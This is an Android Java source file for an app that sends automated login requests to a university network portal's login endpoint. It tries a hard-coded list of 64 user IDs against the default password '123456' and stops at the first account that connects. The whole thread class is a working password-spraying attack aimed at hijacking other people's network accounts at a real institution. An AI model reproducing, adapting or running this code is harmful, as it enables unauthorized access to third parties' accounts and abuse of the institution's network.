package pw.usual.PortalBoasting;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.ToggleButton;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends Activity {
    /**
     * Called when the activity is first created.
     */
    private ToggleButton startButton;
    private TextView logArea;
    private ScrollView scrollView;


    private ExecutorService pool;
    public boolean suspend = false;
    private Thread netThread = null;

    private View.OnClickListener onStartButtonClick = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Log.i("StartButton", "Click.");
            ToggleButton button = (ToggleButton) v;

            if (button.isChecked()){
                logArea.setText("");
                if (null == netThread){
                    netThread = new AttemptThread();
                    netThread.start();
                }
                suspend = false;
            }
            else{
                suspend = true;
            }
        }
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        startButton = (ToggleButton) findViewById(R.id.StartButton);
        logArea = (TextView) findViewById(R.id.LogArea);
        scrollView = (ScrollView) findViewById(R.id.ScrollView);
        pool = Executors.newSingleThreadExecutor();

        startButton.setOnClickListener(onStartButtonClick);
    }

    @Override
    public void onDestroy(){
        pool.shutdown();
        super.onDestroy();
    }

    private class AttemptThread extends Thread{
        private HttpPost httpPost = new HttpPost("http://w.nuaa.edu.cn/iPortal/action/doLogin.do");
        private HttpClient httpClient = new DefaultHttpClient();
        private HttpResponse httpResponse = null;

        private List<NameValuePair> params=new ArrayList<>();
        private BasicNameValuePair valueSaved = new BasicNameValuePair("saved", "0");
        private BasicNameValuePair valueDomain = new BasicNameValuePair("domain", "1");
        private BasicNameValuePair valueFrom = new BasicNameValuePair("from", "003cc944be32e25365428f2dd2adbbe2");
        private BasicNameValuePair valuePassword = new BasicNameValuePair("password", "123456");

        private String stringResponse = null;

        private int []users = {70206044,70205971,70205746,70205743,70205695,70205696,70205456,70205433,70205432,70205410,70205342,70205340,70205331,70205332,70205277,70205155,70205057,70205036,70205034,70204963,70204959,70204952,70204946,70204937,70204880,70204858,70204795,70204723,70204691,70204664,70204665,70204632,70204616,70204596,70204545,70204320,70204314,70204215,70204075,70203975,70203945,70203944,70203912,70203734,70203521,70203443,70203299,70203110,70202991,70202878,70202636,70202578,70202579,70202279,70202031,70201850,70201829,70201776,70201739,70201516,70201463,70201316,70200748,70200340};

        @Override
        public void run(){
            httpClient.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 3000);
            httpClient.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 3000);

            for (int user : users) {
                params.clear();
                params.add(valueSaved);
                params.add(valueDomain);
                params.add(valueFrom);
                params.add(valuePassword);
                params.add(new BasicNameValuePair("username", String.valueOf(user)));

                try {
                    httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
                    httpResponse = httpClient.execute(httpPost);

                    if (httpResponse.getStatusLine().getStatusCode() == 200) {
                        stringResponse = EntityUtils.toString(httpResponse.getEntity());
                        JSONObject json = new JSONObject(stringResponse);
                        final String status = (String) new JSONObject((String) json.get("data")).get("status");

                        final String log = String.valueOf(user) + " " + status + "\n";
                        logArea.post(new Runnable() {
                            @Override
                            public void run() {
                                logArea.append(log);
                                scrollView.fullScroll(View.FOCUS_DOWN);
                            }
                        });

                        if (status.equals("connected")){
                            break;
                        }
                    }
                    else {
                        Log.e("Error", "Http response is " + String.valueOf(httpResponse.getStatusLine().getStatusCode()));
                    }
                }
                catch (JSONException e){
                    Log.e("JsonException", stringResponse);
                }
                catch (SocketTimeoutException e){
                    Log.e("SocketTimeOut", String.valueOf(user));

                    logArea.post(new Runnable() {
                        @Override
                        public void run() {
                            logArea.append(String.valueOf(user) + " timeout");
                        }
                    });
                }
                catch (Exception e) {
                    Log.e("Error", e.getClass().toString());
                }
            }

            startButton.post(new Runnable() {
                @Override
                public void run() {
                    logArea.append("");
                    startButton.setChecked(false);
                }
            });
        }
    }
}
